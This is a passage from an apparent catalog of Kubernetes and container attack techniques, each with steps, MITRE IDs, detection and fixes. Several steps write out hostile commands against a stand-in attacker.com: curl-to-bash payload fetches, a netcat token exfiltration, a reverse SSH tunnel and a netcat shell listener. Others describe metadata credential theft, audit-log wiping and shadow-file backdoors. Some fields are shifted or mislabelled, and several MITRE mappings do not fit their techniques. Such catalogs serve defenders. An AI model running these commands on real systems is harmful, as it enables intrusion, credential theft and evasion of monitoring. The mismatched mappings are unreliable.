- **Attack Steps**: Attacker writes assembly code to execute system calls directly using syscall numbers (e.g., mov rax, 59 for execve). Since Falco hooks libC functions or monitors syscall wrapper patterns, these direct calls evade its detection in some configurations. Binary is compiled and dropped into a container or host. Used to launch stealthy payloads without triggering runtime alerts.
- **Detection**: Trace raw syscalls with eBPF or strace; verify syscall patterns
- **Solution**: Upgrade Falco rules to monitor raw syscalls and use kernel-level filters
- **Tags**: #syscall #nativeapi #falcoevasion #assembly

## InitContainer Extracts Cloud Tokens via Metadata API

- **Attack Type**: Metadata Token Theft
- **Target**: Kubernetes Node
- **Vulnerability**: Metadata endpoint exposed inside pod network
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Cloud IAM tokens stolen via boot-time job
- **Tools**: curl, bash, nc
- **Scenario**: InitContainer accesses instance metadata endpoint and exfiltrates tokens before main app starts.
- **Attack Steps**: InitContainer executes curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ and parses response for AWS role credentials. Writes tokens to a shared volume or sends via netcat to remote server. Since InitContainers run before main containers and are often unaudited, token theft may go unnoticed. Used for cloud API access beyond Kubernetes.
- **Detection**: Log access to metadata endpoint from containers
- **Solution**: Restrict metadata access using firewall policies
- **Tags**: #cloudtoken #initcontainer #metadata #awsattack

## PodSpec Abuse: Hidden Container in YAML Comment

- **Attack Type**: YAML Comment Payload
- **Target**: Kubernetes Cluster
- **Vulnerability**: Manual reviews or admission policies skip commented code
- **MITRE**: T1601.002 (Modify System Image: Container)
- **Impact**: Backdoor embedded silently in config and reactivated later
- **Tools**: kubectl, vi, bash
- **Scenario**: Attacker hides malicious container spec inside a YAML comment, then reactivates it later.
- **Attack Steps**: Attacker creates a Pod manifest with a second malicious container commented out in YAML (e.g., `# - name: evil-container`). Pod is approved and deployed with only legitimate container. Later, attacker patches the pod or config map and re-enables the second container. This avoids initial code review or admission control while retaining malicious logic embedded in the manifest.
- **Detection**: Use automated YAML parsers that check all content, even comments
- **Solution**: Block manifests with commented-out container specs
- **Tags**: #yaml #evasion #commentedcode #containerhijack

## Persistent Shell via CronJob Using Reverse SSH Tunnel

- **Attack Type**: SSH Reverse Tunnel
- **Target**: Kubernetes Container
- **Vulnerability**: Egress to attacker's IP allowed; reverse tunnels undetected
- **MITRE**: T1090.001 (Proxy: Internal Proxy)
- **Impact**: Out-of-band shell with backchannel control
- **Tools**: ssh, kubectl, autossh
- **Scenario**: Persistent CronJob sets up reverse SSH tunnel from cluster to attacker host.
- **Attack Steps**: Attacker deploys CronJob every 5 minutes to run ssh -R 2222:localhost:22 attacker.com. Tunnel allows attacker to connect back into the container via port 2222. Autossh keeps tunnel alive. This reverse tunnel bypasses NAT, firewall, and egress monitoring. Used for persistent interactive access without exposing Kubernetes service ports.
- **Detection**: Log reverse SSH behavior; monitor port reuse and ssh binaries
- **Solution**: Block outbound SSH and detect tunnel persistence
- **Tags**: #reverse_ssh #cronjob #autossh #covertaccess

## LD_PRELOAD Injection in Shared Container Volume

- **Attack Type**: Library Injection
- **Target**: Kubernetes Container
- **Vulnerability**: Improper environment controls; shared volumes
- **MITRE**: 
- **Impact**: T1574.006 (Hijack Execution Flow: LD_PRELOAD)
- **Tools**: gcc, bash, shared volume
- **Scenario**: Attacker uses LD_PRELOAD to hijack common system calls and inject malicious logic.
- **Attack Steps**: Attacker writes a shared library that overrides functions like open(), execve(), or getenv(). They preload it by setting LD_PRELOAD environment variable in container spec. Main app unknowingly loads the malicious library from shared volume on startup. Used to intercept credentials, alter behavior, or log sensitive inputs. Stays hidden unless binaries are traced.
- **Detection**: Application logic hijacked silently via environment variable
- **Solution**: Check for suspicious LD_PRELOAD values in container env
- **Tags**: Use runtime policies that block unapproved libraries

## Use Sidecar Container to Rotate SSH Key Automatically

- **Attack Type**: Auto Key Injection
- **Target**: Kubernetes Pod
- **Vulnerability**: Sidecar can modify main container SSH configs
- **MITRE**: T1098 (Account Manipulation)
- **Impact**: Access persistence via auto-updating backdoor credentials
- **Tools**: curl, bash, cron
- **Scenario**: Sidecar checks attacker’s server and updates authorized_keys if changed.
- **Attack Steps**: Sidecar container runs a script every 10 minutes that downloads a public key from attacker.com/key.txt. It rewrites or appends to ~/.ssh/authorized_keys of main container. This keeps attacker access alive even if defender removes old key. Key rotation also prevents detection from static IOC scans.
- **Detection**: Audit containers that modify SSH configs; monitor curl activity
- **Solution**: Disallow SSH setup in container environments; restrict volume access
- **Tags**: #sshrotate #sidecar #authorizedkeys #backdoor

## Redirect Logs to Null via Mounted /dev/null

- **Attack Type**: Log Destruction
- **Target**: Kubernetes Node
- **Vulnerability**: Log sink overridden by /dev/null mount
- **MITRE**: T1564.001 (Hide Artifacts: Hidden Files and Directories)
- **Impact**: Prevents all local logs from being written or audited
- **Tools**: kubectl, mount, bash
- **Scenario**: Attacker mounts /dev/null over logs directory to drop all output silently.
- **Attack Steps**: Attacker creates pod or container with hostPath mount: mountPath: /var/log, hostPath: /dev/null. As a result, any logging by the application is discarded instantly. This disables forensic traces, hinders monitoring, and avoids detection by Falco or auditd. Especially effective if attacker compromises base image or container template.
- **Detection**: Detect unexpected mounts of /dev/null or shadow logs
- **Solution**: Use admission controllers to block suspicious volume paths
- **Tags**: #logbypass #devnull #containerlogs #evasion

## Dynamic DaemonSet That Modifies iptables Periodically

- **Attack Type**: Egress Interruption
- **Target**: Kubernetes Cluster
- **Vulnerability**: Egress controls not enforced or audited
- **MITRE**: T1562.004 (Disable or Modify System Firewall)
- **Impact**: Timed blind spots in network logging and security coverage
- **Tools**: iptables, kubectl, cron
- **Scenario**: DaemonSet adds and removes iptables rules to block specific domains temporarily.
- **Attack Steps**: Attacker deploys DaemonSet with cron-based task that every 15 minutes inserts iptables DROP rules for security domains or logging collectors (e.g., SIEM backend, EDR cloud). After a while, rules are deleted. This cycling avoids detection and ensures minimal audit logs while blocking defenses during exploitation windows.
- **Detection**: Log iptables rule insertions; monitor network flows in real time
- **Solution**: Enforce static network policies; audit DaemonSet cron actions
- **Tags**: #iptables #timedevasion #networkmute #firewall

## Overwrite Entry Point of Official Container Image

- **Attack Type**: Entrypoint Hijack
- **Target**: Kubernetes Pod
- **Vulnerability**: Image policy bypass via custom entrypoint
- **MITRE**: T1601.001 (Modify System Image: Disk Image)
- **Impact**: Execution of attacker logic from trusted image base
- **Tools**: docker, kubectl, bash
- **Scenario**: Attacker modifies pod spec to override the entrypoint of trusted container image.
- **Attack Steps**: Instead of building a new image, attacker uses image: nginx:latest and sets entrypoint: ["/bin/bash", "-c", "curl attacker.com/run.sh | bash"]. The container still appears to use a trusted base image, but the override executes attacker logic. Used to bypass image scanning tools and defenders trusting image names.
- **Detection**: Check overridden entrypoint vs official default
- **Solution**: Use image signature validation and enforce static commands
- **Tags**: #entrypointhack #containershadow #trustedabuse

## Persistent Host Access Using Remount via Privileged Pod

- **Attack Type**: Host Filesystem Backdoor
- **Target**: Kubernetes Host
- **Vulnerability**: Privileged pod allows full host control via remount
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: System-level persistence beyond container lifecycle
- **Tools**: kubectl, mount, bash
- **Scenario**: Attacker remounts host filesystem from container and plants persistence logic.
- **Attack Steps**: Attacker uses a privileged pod with hostPath: / and mounts host filesystem to /mnt. Inside container, remounts /mnt/etc to RW and adds cronjob or modifies systemd units to call remote shell script or keep attacker shell alive. Changes persist even if container is deleted. Bypasses container security completely.
- **Detection**: Detect hostPath mounts in podspecs; validate /etc file writes
- **Solution**: Disallow privileged containers and hostPath mounts
- **Tags**: #hostaccess #persistence #containerescape #remount

## Use Fake Volume Mount to Hide Malicious Binaries

- **Attack Type**: Mount Overlay Evasion
- **Target**: Kubernetes Pod
- **Vulnerability**: Volume mounts can shadow real system directories
- **MITRE**: T1564.006 (Hide Artifacts: Hidden Filesystem)
- **Impact**: Runtime behavior diverges from trusted image view
- **Tools**: kubectl, mount, bash
- **Scenario**: Attacker uses overlay volume mounts to hide actual malicious binaries behind trusted paths.
- **Attack Steps**: Attacker defines a volumeMount in the pod spec that overlays a trusted path like /usr/bin with a writable volume. Inside that volume, they place malicious versions of binaries like ps, netstat, or ssh. These override the originals during container runtime without modifying the image. Security scanners that check image contents see only clean binaries, while actual runtime execution is hijacked by the attacker's files.
- **Detection**: Check for overlapping mount paths in pod specs
- **Solution**: Use read-only root filesystem and validate mount policies
- **Tags**: #overlay #volumemount #binarystealth #kubernetes

## Exploit Host Mount via Docker Socket in Container

- **Attack Type**: Docker Socket Abuse
- **Target**: Docker Host
- **Vulnerability**: Runtime access to Docker daemon from container
- **MITRE**: T1525 (Implant Container Image)
- **Impact**: Full host takeover via container escape and Docker abuse
- **Tools**: curl, docker CLI, bash
- **Scenario**: Attacker uses mounted /var/run/docker.sock to control host Docker and deploy backdoors.
- **Attack Steps**: Container includes host Docker socket as volume. Inside container, attacker runs docker run -v /:/mnt --privileged alpine chroot /mnt. This gives full access to host file system. Attacker drops persistence logic into systemd services or crontab, and even launches new containers on the host. Entire compromise bypasses Kubernetes visibility if Docker is running directly.
- **Detection**: Audit for docker.sock mounts inside containers
- **Solution**: Prohibit access to host Docker socket; isolate runtime
- **Tags**: #dockersocket #escape #containercontrol #hosttakeover

## Overwrite Container Binary with Sleep to Halt Behavior

- **Attack Type**: Functionality Removal
- **Target**: Simple Container
- **Vulnerability**: File write access not restricted or monitored
- **MITRE**: T1565.001 (Stored Data Manipulation: Transmitted Data Manipulation)
- **Impact**: App disabled silently, no logs or alerts
- **Tools**: bash, mv, cp
- **Scenario**: Attacker overwrites application binary inside container with sleep to disable functionality.
- **Attack Steps**: Attacker gains write access inside container and runs cp /bin/sleep /usr/local/bin/app_binary. This causes the application to "sleep" instead of performing its intended logic. Used to disable logging agents, security tools, or watchdogs inside the container. Change remains until container restarts or image is replaced.
- **Detection**: Logs show unexpected behavior or absence of expected tasks
- **Solution**: Use read-only container filesystem and validate binaries
- **Tags**: #binaryoverwrite #sleephack #appdisable #containerdefense

## Intercept API Tokens from Env Vars via Sidecar

- **Attack Type**: Sidecar Token Theft
- **Target**: Kubernetes Pod
- **Vulnerability**: Sidecar has access to main container’s environment
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Token exfiltration without process injection
- **Tools**: kubectl, bash, nc
- **Scenario**: Attacker deploys a sidecar that reads environment variables and exfiltrates tokens.
- **Attack Steps**: Sidecar runs a simple script like env | grep TOKEN > /shared/token.log && nc attacker.com 4444 < /shared/token.log. It accesses env vars of the main container via shared volume or shell context. Used to steal access tokens, secrets, or AWS credentials. Runs silently in background; main app remains unaware.
- **Detection**: Monitor environment access from sidecars
- **Solution**: Limit token injection into env vars; isolate credentials
- **Tags**: #sidecar #envleak #tokentheft #k8s

## InitContainer Backdoors Base Image Before App Launch

- **Attack Type**: Image Backdoor via InitContainer
- **Target**: Kubernetes Pod
- **Vulnerability**: InitContainer allowed to modify base layer artifacts
- **MITRE**: T1601 (Modify System Image)
- **Impact**: App logic altered pre-runtime with no external change to image
- **Tools**: kubectl, tar, cp, bash
- **Scenario**: InitContainer modifies contents of base image before app starts.
- **Attack Steps**: InitContainer mounts shared volume and extracts root filesystem of main container using tar or cp. It then injects malicious script, replaces startup binaries, or alters config. The app container unknowingly starts with tampered base files, making traditional image scanning useless. Persistence survives restarts.
- **Detection**: Hash comparison between image and runtime; track InitContainer behavior
- **Solution**: Block InitContainers from sharing app data volumes
- **Tags**: #imagebackdoor #initcontainer #tamper #runtimeevasion

## Exploit --network=host to Poison DNS Cache

- **Attack Type**: DNS Poisoning via HostNetwork
- **Target**: HostNetwork Container
- **Vulnerability**: Containers share DNS context with host
- **MITRE**: T1557.001 (Man-in-the-Middle)
- **Impact**: Redirect internal traffic to attacker infrastructure
- **Tools**: nsupdate, dig, bash
- **Scenario**: Container with host network modifies DNS cache to redirect traffic.
- **Attack Steps**: Attacker runs container with --network=host and uses nsupdate or modifies /etc/resolv.conf to redirect common internal domains (e.g., metadata service or vault) to attacker's IP. Any other containers or host processes resolving those names are redirected silently. Effective for MITM attacks and stealing secrets.
- **Detection**: Monitor DNS changes on host; validate DNS resolution inside containers
- **Solution**: Disable hostNetwork except in essential infra pods
- **Tags**: #dns #networkhost #poisoning #kubernetessecurity

## Disable Logging Agent with Kernel Panic Trigger

- **Attack Type**: Agent Crash Trigger
- **Target**: Privileged Container
- **Vulnerability**: Misused kernel configs can disable system agents
- **MITRE**: T1499.004 (Endpoint Denial of Service)
- **Impact**: Log agent crash causes blind spot for detection
- **Tools**: sysctl, echo, bash
- **Scenario**: Attacker sends malformed data or uses kernel feature to crash containerized logging agent.
- **Attack Steps**: Inside container, attacker runs sysctl -w kernel.core_pattern=/dev/null and then triggers invalid syscall or segmentation fault (e.g., echo c > /proc/sysrq-trigger). This causes logging agent container to crash. Monitoring is disabled temporarily, allowing attacker to proceed with other actions. Requires elevated container privileges.
- **Detection**: Detect sysctl misuse and crash signatures
- **Solution**: Restrict kernel parameter access from containers
- **Tags**: #agentcrash #loggingdisable #kernelpanic #evasion

## Shadow Copy of Falco Running with Modified Rules

- **Attack Type**: Shadow Detection Bypass
- **Target**: Log Monitoring Infrastructure
- **Vulnerability**: Fake or misconfigured agent mimics security service
- **MITRE**: T1036.005 (Masquerading: Match Legitimate Name or Location)
- **Impact**: Perceived security presence with hollow coverage
- **Tools**: docker run, falco, bash
- **Scenario**: Attacker runs own Falco instance with weakened rules to trick defenders.
- **Attack Steps**: Attacker runs a second Falco instance with --config pointing to custom falco_rules.yaml missing key detections. They redirect logs to the same collector or SIEM. Defender sees “Falco active” but alerts are incomplete. Used to bypass detection while appearing compliant.
- **Detection**: Validate rule set and hash of all detection agents
- **Solution**: Enforce agent configuration integrity and alert parity
- **Tags**: #falcobypass #shadowagent #mimic #configattack

## CronJob Encodes Payload in Base64 to Evade Detection

- **Attack Type**: Base64 Obfuscation
- **Target**: Kubernetes Cluster
- **Vulnerability**: Log alerting relies on plaintext keyword matching
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Command runs silently unless decoded
- **Tools**: base64, bash, kubectl
- **Scenario**: CronJob uses obfuscated payload to avoid alert keywords.
- **Attack Steps**: Attacker writes a CronJob that executes `echo ZWNobyAiSGVsbG8gV29ybGQiCg== | base64 -d | bash`. Payload avoids regex-based detection for keywords like "curl", "reverse shell", etc. Defender reviewing logs sees only harmless base64 string. Used to bypass Falco or log alerting tools.
- **Detection**: Use behavioral rules and command chain detection
- **Solution**: Scan for use of base64 and decoding binaries in scripts
- **Tags**: #obfuscation #base64 #cronjob #logevasion

## HostPort Abuse for Remote Backdoor Access

- **Attack Type**: HostPort Backdoor
- **Target**: Host-Networked Container
- **Vulnerability**: HostPort opens direct external access to container
- **MITRE**: T1055 (Process Injection)
- **Impact**: Remote access channel established outside cluster controls
- **Tools**: kubectl, bash, nc
- **Scenario**: Container opens backdoor by binding shell listener to HostPort.
- **Attack Steps**: Pod spec sets containerPort: 4444 and hostPort: 4444. Inside, attacker runs `nc -lvp 4444 -e /bin/sh`. Listener becomes accessible on node’s IP directly (e.g., http://nodeip:4444). Even if container dies, port remains open if pod restartPolicy is set to Always. Easy for attacker to connect remotely without Kubernetes ingress rules.
- **Detection**: Log unexpected HostPort usage; scan for suspicious bindings
- **Solution**: Disallow HostPort usage unless explicitly required
- **Tags**: #hostport #reverse_shell #externalaccess #containerbypass

## InitContainer Deletes Audit Logs at Startup

- **Attack Type**: Startup Log Wipe
- **Target**: InitContainer / Host
- **Vulnerability**: Log location exposed to container via hostPath
- **MITRE**: T1070.001 (Indicator Removal on Host: Clear Logs)
- **Impact**: Complete audit trail deletion before app boots
- **Tools**: rm, bash, kubectl
- **Scenario**: InitContainer deletes audit logs before application starts.
- **Attack Steps**: Attacker configures InitContainer to mount the host audit directory (e.g., /var/log/audit) using hostPath. During the init phase, it executes `rm -rf /mnt/audit/*` wiping all previous audit logs. This ensures any malicious container actions from previous sessions are unrecoverable. The main application container starts cleanly, making forensic investigation impossible.
- **Detection**: Monitor InitContainers with access to sensitive host paths
- **Solution**: Block access to host log directories via admission policies
- **Tags**: #logdeletion #initcontainer #auditevasion #kubernetes

## Exploit Node DaemonSet with Log Forwarding Disabled

- **Attack Type**: Unmonitored Execution
- **Target**: Kubernetes Node
- **Vulnerability**: Log forwarding agent not deployed or misconfigured
- **MITRE**: T1562.002 (Disable or Modify Tools)
- **Impact**: Node silently compromised without alert
- **Tools**: kubectl, bash
- **Scenario**: Attacker runs malicious DaemonSet on node where log forwarding is misconfigured.
- **Attack Steps**: Attacker scans for nodes without log forwarding (e.g., Fluentd not running). Deploys DaemonSet targeting only those nodes using nodeSelector or affinity. The malicious pod executes payloads, reads files, or pivots from node without generating central logs. Defender only sees normal node health, unaware of activities on logging-disabled nodes.
- **Detection**: Log completeness monitoring across nodes
- **Solution**: Use node taints or alerts for Fluentd and EDR unavailability
- **Tags**: #daemonset #logginggap #nodepivot #evasion

## Abuse CronJob for Fileless Execution in Memory

- **Attack Type**: Fileless Execution
- **Target**: Kubernetes CronJob
- **Vulnerability**: Fileless nature avoids detection by file scanners
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: Runtime payload hidden from filesystem-based tools
- **Tools**: curl, bash, cron
- **Scenario**: CronJob downloads and executes payload directly into memory.
- **Attack Steps**: Attacker deploys CronJob that runs `curl http://attacker.com/payload.sh | bash` every 5 minutes. Script never touches disk — executes via pipeline. Avoids traditional file-based antivirus, logs only minimal curl activity, and survives across reboots via rescheduling. Useful for running reconnaissance, persistence logic, or C2 beacons.
- **Detection**: Log external requests and inline command execution
- **Solution**: Block CronJob usage for external shell scripts
- **Tags**: #fileless #cronjob #memexec #evasion

## Breakout via HostPath Volume Mount to /etc/shadow

- **Attack Type**: Host Credential Manipulation
- **Target**: Kubernetes Host
- **Vulnerability**: Misuse of hostPath for system file access
- **MITRE**: T1078 (Valid Accounts)
- **Impact**: Attacker creates host-level account from container
- **Tools**: kubectl, bash, openssl
- **Scenario**: Attacker mounts host /etc/shadow file and inserts backdoor user.
- **Attack Steps**: Pod uses hostPath to mount /etc/shadow from host. Attacker hashes a new password using `openssl passwd -6`, edits the file inside container, and appends a new user line. The user is then valid on the host OS with known credentials. This allows attacker to SSH or escalate in future. Persistence remains even if container is deleted.
- **Detection**: Monitor for /etc file access in container volumes
- **Solution**: Restrict hostPath usage to read-only and audit for sensitive paths
- **Tags**: #shadowfile #hostpath #sshbackdoor #kubernetes

## Tamper Falco Sidekick to Drop High Severity Alerts

- **Attack Type**: Alert Sinkhole
- **Target**: Falco Monitoring Pipeline
- **Vulnerability**: Sidekick misconfiguration prevents alert delivery
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Falco logs appear fine but alerts never reach destination
- **Tools**: vi, docker, falco-sidekick
- **Scenario**: Attacker modifies Falco sidekick config to discard critical alerts.
- **Attack Steps**: Attacker locates Falco sidekick config (e.g., sidekick-config.yaml) and sets filters to discard "critical" severity or specific rule names (e.g., exec shell). Alternatively, attacker injects webhook filter rules to send alerts to /dev/null endpoint or delays posting. This weakens or disables alerting while keeping Falco running.
- **Detection**: Verify sidekick configs and alert delivery per severity level
- **Solution**: Use checksum validation and monitor alert delivery rates
- **Tags**: #falco #sidekick #alertevasion #k8s

## Redirect stdout/stderr of Security Agent to Null

- **Attack Type**: Output Mute
- **Target**: Falco / Sysdig Agent
- **Vulnerability**: Output redirection bypasses log collection
- **MITRE**: T1564.002 (Hide Artifacts: Hidden Users)
- **Impact**: Security agent logs completely muted
- **Tools**: bash, echo, >, 2>&1
- **Scenario**: Attacker silences runtime agent logs using shell redirection.
- **Attack Steps**: Inside container or host, attacker modifies service command or unit file to add `> /dev/null 2>&1`, silencing both stdout and stderr. Agent continues execution, but logs are suppressed. If defender monitors only log files and not behavior, this trick delays detection. Used in startup scripts, Falco, or Sysdig agents.
- **Detection**: Compare expected log volume and runtime events
- **Solution**: Disallow or detect use of null redirection in service commands
- **Tags**: #logmute #stderr #falcosilent #agentattack

## Use PID Namespace to Evade Falco Process Rules

- **Attack Type**: Process Isolation
- **Target**: Kubernetes Pod
- **Vulnerability**: Namespace separation breaks monitoring context
- **MITRE**: T1036.005 (Masquerading: Match Legitimate Name or Location)
- **Impact**: Process activity hidden from host-level detectors
- **Tools**: docker run --pid, ps, bash
- **Scenario**: Evil pod uses separate PID namespace to prevent visibility to Falco on host.
- **Attack Steps**: Attacker starts container with `--pid=container:<target-id>` to share namespace with trusted container but stay invisible to Falco on host. Since Falco hooks host PID namespace, actions inside isolated or container-shared namespaces evade its detection. Attacker executes binaries, drops files, or spawns hidden shells.
- **Detection**: Monitor namespace usage and container pid modes
- **Solution**: Restrict --pid usage and enforce pod isolation policies
- **Tags**: #pidns #falcoevasion #processhiding #containers

## Drop CronJob in kube-system to Evade Detection

- **Attack Type**: Namespace Hiding
- **Target**: Kubernetes Cluster
- **Vulnerability**: High-privilege namespace abused for persistence
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: CronJob persists attacker logic under trusted identity
- **Tools**: kubectl, bash
- **Scenario**: Attacker deploys malicious CronJob inside `kube-system` namespace.
- **Attack Steps**: Attacker creates a CronJob called kube-updater or net-monitor inside kube-system namespace. Due to its trusted context, defenders often ignore job behavior in this namespace. CronJob executes persistence shell, data exfil, or SSH key planting logic on schedule. Survives reboots and avoids suspicion.
- **Detection**: Audit all workloads in kube-system; validate controller identities
- **Solution**: Block job creation in kube-system except for specific controllers
- **Tags**: #kubesystem #cronjob #namespaceevasion #persistence

## Abuse /proc/*/environ to Leak Secrets from Other Pods

- **Attack Type**: Proc FS Secret Theft
- **Target**: Container Runtime
- **Vulnerability**: /proc exposure leaks sensitive process metadata
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Secrets accessed from memory without breaking into app
- **Tools**: cat, bash, pidof
- **Scenario**: Attacker reads environment variables of other processes via /proc.
- **Attack Steps**: Attacker gains container or host access and reads `/proc/<pid>/environ` of running processes. This exposes environment variables including credentials, tokens, and API keys. Common in shared PID namespaces or with elevated privileges. Allows credential theft without direct app compromise.
- **Detection**: Monitor reads of /proc/*/environ from non-root tools
- **Solution**: Isolate PID namespaces and restrict /proc access via seccomp
- **Tags**: #procfs #secretleak #environment #pidaccess

## Fake Container Metrics to Spoof Health and Avoid Restart

- **Attack Type**: Metrics Spoofing
- **Target**: Kubernetes Pod
- **Vulnerability**: Fake responses trick health probes and monitoring
- **MITRE**: T1562.004 (Disable or Modify System Firewall)
- **Impact**: Malicious pod stays active while appearing healthy
- **Tools**: curl, bash, HTTP server
- **Scenario**: Attacker fakes readiness/liveness probe results to avoid restarts.
- **Attack Steps**: Attacker runs internal web server at /health endpoint returning HTTP 200 even if container is malicious. Liveness/readiness probes configured in Pod spec falsely report container as healthy. Defender sees healthy status while payload is active. Used to prevent container from restarting or attracting suspicion.
- **Detection**: Audit actual application behavior vs reported health probe results
- **Solution**: Use external monitoring and process-level verification
- **Tags**: #fakehealth #spoofprobe #containerstatus #evasion

## Swap Runtime Binary with Legitimate Name

- **Attack Type**: Binary Masquerading
- **Target**: Kubernetes Pod
- **Vulnerability**: Filesystem write access; lack of binary integrity checks
- **MITRE**: T1036.003 (Masquerading: Rename System Utilities)
- **Impact**: Execution of trusted-looking but malicious binary
- **Tools**: mv, cp, bash, gcc
- **Scenario**: Attacker replaces a runtime binary (e.g., curl) with a malicious payload of the same name.
- **Attack Steps**: Attacker compiles a custom backdoored binary named `curl` that opens a reverse shell or downloads malware. Inside the container or via mounted volume, they overwrite the real `/usr/bin/curl` with their binary. When monitoring or scripts call curl, the attacker’s version runs instead. This evasion tactic hides in plain sight under known binary names.
- **Detection**: Check hash and file size of critical binaries inside containers
- **Solution**: Use immutable infrastructure and read-only file systems
- **Tags**: #masquerading #binaryswap #containerhijack #runtimeevasion

## Abuse NetworkPolicy Gaps to Exfiltrate Logs Undetected

- **Attack Type**: Covert Exfiltration
- **Target**: Namespace Pod
- **Vulnerability**: Missing or misconfigured NetworkPolicies
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Logs or sensitive data are stolen silently
- **Tools**: kubectl, curl, nc
- **Scenario**: Attacker identifies pods without egress restrictions and uses them to send logs externally.
- **Attack Steps**: Attacker scans namespace for pods with unrestricted NetworkPolicies. Once identified, they install a log-scraping script or agent and use tools like `curl` or `nc` to send data to an external server. Since many Kubernetes clusters don’t enforce egress restrictions uniformly, this allows stealthy log/data exfiltration from selected workloads.
- **Detection**: Monitor egress traffic from untrusted namespaces
- **Solution**: Apply default-deny NetworkPolicies and whitelist only required domains
- **Tags**: #networkpolicy #egressevasion #logleak #kubernetes

## Modify Falco ConfigMap to Disable Specific Rules

- **Attack Type**: Config Tampering
- **Target**: Kubernetes Cluster
- **Vulnerability**: ConfigMaps editable without RBAC lockdown
- **MITRE**: T1562.001 (Impair Defenses: Disable or Modify Tools)
- **Impact**: Falco runs silently with reduced coverage
- **Tools**: kubectl edit, yaml
- **Scenario**: Attacker edits Falco’s ConfigMap to disable noisy or high-value detection rules.
- **Attack Steps**: Attacker gains permission to `kubectl edit configmap falco-config` and comments out rules such as "shell in container" or "write below /etc". After update, they restart Falco pods to apply changes. Defender may not notice subtle config change, especially in large clusters. Result: reduced detection fidelity.
- **Detection**: Alert on rule count or configMap hash mismatch
- **Solution**: Apply RBAC to restrict configmap write access
- **Tags**: #falco #configtampering #k8ssecurity #alertevasion

## Reverse Shell Embedded in Kubernetes Liveness Probe

- **Attack Type**: Probe Exploitation
- **Target**: Container
- **Vulnerability**: Custom probe handler logic hijacked for persistence
- **MITRE**: T1059.003 (Command and Scripting Interpreter: Unix Shell)
- **Impact**: Stealthy backdoor embedded in liveness probe endpoint
- **Tools**: nc, bash, kubectl
- **Scenario**: Attacker adds reverse shell logic inside HTTP server that serves as health probe.
- **Attack Steps**: Container runs a lightweight HTTP server for `/healthz` liveness probe. Attacker modifies the handler code so that after a specific number of probe hits or on specific user-agent, it triggers a reverse shell to the attacker. Since it still returns HTTP 200 for Kubernetes, container appears healthy. This bypasses monitoring while providing access.
- **Detection**: Scan probe handler logic for obfuscated or non-standard behavior
- **Solution**: Use static analysis or endpoint monitoring for probe servers
- **Tags**: #liveness #reverse_shell #kubernetesprobe #evasion

## Stealth Persistence via Kubernetes API Server Proxy

- **Attack Type**: API Abuse
- **Target**: Kubernetes API
- **Vulnerability**: Server-side proxy feature abused for covert traffic
- **MITRE**: T1090.001 (Proxy: Internal Proxy)
- **Impact**: Covert lateral movement using Kubernetes proxy
- **Tools**: kubectl, bash, API call
- **Scenario**: Attacker uses kube-apiserver’s /proxy to interact with internal services without leaving network logs.
- **Attack Steps**: Instead of direct service-to-service requests, attacker uses `kubectl proxy` or `curl https://kube-apiserver/api/v1/namespaces/default/services/http:webapp:/proxy` to interact with services. This approach avoids DNS lookups and logs in traditional network monitoring tools. Useful to exfil data or control internal pods without egress.
- **Detection**: Audit kube-apiserver access patterns; monitor unusual proxy calls
- **Solution**: Restrict kube-proxy usage and log internal routing via audit policies
- **Tags**: #apiproxy #stealthaccess #k8sapi #defensiveevasion

## Fake Systemd Process in Container for Persistence

- **Attack Type**: Process Masquerading
- **Target**: Kubernetes Pod
- **Vulnerability**: Process list faked to appear benign
- **MITRE**: T1036.005 (Masquerading: Match Legitimate Name or Location)
- **Impact**: Attacker process blends with trusted ones
- **Tools**: ps, bash, exec, prctl
- **Scenario**: Attacker renames process inside container to appear like systemd or trusted binary.
- **Attack Steps**: Attacker starts a long-running process (e.g., shell loop or beacon) but renames it using `prctl(PR_SET_NAME)` or starts it with `exec -a systemd bash`. When defenders check running processes, they see fake systemd or sshd. This avoids suspicion, especially in busy containers.
- **Detection**: Process behavior doesn’t match expected signature; audit for exec -a usage
- **Solution**: Use behavioral detection instead of process name alone
- **Tags**: #processmasking #systemdspoof #prctl #k8sevasion

## Using Kubernetes Finalizers to Delay Resource Deletion

- **Attack Type**: Finalizer Abuse
- **Target**: Kubernetes API
- **Vulnerability**: Resource deletion blocked by unremoved finalizer
- **MITRE**: T1499.003 (Endpoint Denial of Service)
- **Impact**: Persistent presence even after attempted deletion
- **Tools**: kubectl, yaml, jq
- **Scenario**: Attacker adds a finalizer to their malicious pod or config to block deletion.
- **Attack Steps**: Attacker deploys malicious resource and adds a `finalizer` field to its metadata (e.g., `finalizers: [malicious.cleanup.io]`). When defender attempts to delete it, Kubernetes keeps it in `Terminating` state indefinitely. Unless the finalizer is manually removed, attacker logic stays active. Used to prevent incident cleanup.
- **Detection**: Log resources stuck in Terminating phase too long
- **Solution**: Monitor and alert on unusual or unknown finalizers
- **Tags**: #finalizer #resourcedeletion #persistence #kubernetes

## InitContainer Injects SSH Keys into Host .ssh Folder

- **Attack Type**: Host Key Injection
- **Target**: Kubernetes Host
- **Vulnerability**: Root path access during boot-time via InitContainer
- **MITRE**: T1098 (Account Manipulation)
- **Impact**: SSH backdoor planted silently before application starts
- **Tools**: bash, hostPath, kubectl
- **Scenario**: InitContainer plants attacker’s SSH public key into host /root/.ssh/authorized_keys.
- **Attack Steps**: Attacker creates InitContainer with hostPath mount to `/root/.ssh/`. On boot, it appends attacker’s public key to `authorized_keys`. Once done, attacker can SSH into host node at any time. Since InitContainer runs only at pod creation, its activity is often overlooked.
- **Detection**: Audit hostPath access to sensitive paths; check key file changes
- **Solution**: Block root path hostMounts for non-privileged pods
- **Tags**: #sshkey #initcontainer #hostbackdoor #persistence

## Exploit Host Networking to Intercept Etcd Traffic

- **Attack Type**: Etcd Interception
- **Target**: Kubernetes Control Plane
- **Vulnerability**: Etcd often runs on plaintext; hostNetwork exposes traffic
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Sensitive cluster configuration leaked over network
- **Tools**: tcpdump, bash, kubectl
